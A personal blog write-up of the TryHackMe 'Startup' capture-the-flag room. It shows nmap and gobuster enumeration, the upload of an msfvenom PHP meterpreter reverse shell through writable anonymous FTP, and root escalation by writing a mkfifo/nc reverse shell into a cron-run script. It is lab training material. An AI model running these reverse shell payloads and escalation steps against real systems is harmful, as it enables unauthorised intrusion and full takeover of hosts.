---
layout: default
title : Startup - Writeup
---

# [Main](https://bvr0n.github.io/) &nbsp;&nbsp;   [Contact](https://bvr0n.github.io/contact.html) &nbsp;&nbsp; [About Me](./aboutme.md) <br>

_**Nov 09, 2020**_

[Startup](https://tryhackme.com/room/startup) Writeup

## Nmap Scan :

```
bvr0n@kali:~$ nmap -sC -sV 10.10.252.135
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.14.157
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enum :

```
bvr0n@kali:~$ gobuster dir -u http://10.10.252.135/ -w Documents/Dirbuster/wordlist.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.252.135/
[+] Threads:        10
[+] Wordlist:       Documents/Dirbuster/wordlist.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/08 06:58:30 Starting gobuster
===============================================================
/***** (Status: 301)
```
The `/*****` is holding the shared files via `FTP`, we gonna need it later to execute our shell.

## FTP :

```                                                        
bvr0n@kali:~$ ncftp 10.10.252.135
Connecting to 10.10.252.135...                                                                                                         
ncftp / > ls
ftp/         notice.txt
ncftp / > ls -la
drwxrwxrwx    2 65534    65534        4096 Nov 09 17:24 ftp
```

I noticed that we can write in `/ftp`, so let's upload a reverse shell there, and execute it in the web browser :

Create a payload :

```
bvr0n@kali:~$ msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw > startup.php
```

Upload it into `/ftp/`:

```
ncftp /ftp > put startup.php
startup.php:                                            37.42 kB  124.55 kB/s  
Could not preserve times for startup.aspx: UTIME failed.
ncftp /ftp >
```
Set a Metasploit handler and exploit :

```
msf5 exploit(multi/handler) > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
msf5 exploit(multi/handler) > set LHOST tun0
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.8.14.157:4444 
[*] Meterpreter session 2 opened (10.8.14.157:4444 -> 10.10.223.78:34244) at 2020-11-09 12:29:21 -0500
```

## Internal Enum :

So i stumbbles across a `Traffic Capture` file, after analysing it, i noticed a password for `Lennie`:
```
[sudo] password for www-data: 
@       ******************
6%      @
Sorry, try again.
```
for the root part, there is a script inside `/lennie` that going to allow us to pivot :

```
root@startup:~# cat /home/lennie/scripts/planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

So basically what this script does,`root` is running what ever on `/etc/print.sh`, lucky for us is it writeable by us :D :

```
root@startup:~# ls -la /etc/print.sh 
-rwx------ 1 lennie lennie 91 Nov  9 18:48 /etc/print.sh
```
So i filled it with a basic reverse shell :

```
root@startup:~# cat /etc/print.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f
```
Now we are set to go, set up a `nc` listener and execute `planner.sh`, and you should get a shell ;)

```
root@startup:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
startup
```

<br>
best regards

[bvr0n](https://github.com/bvr0n)


<br>
[back to main()](../../index.md)

<br>
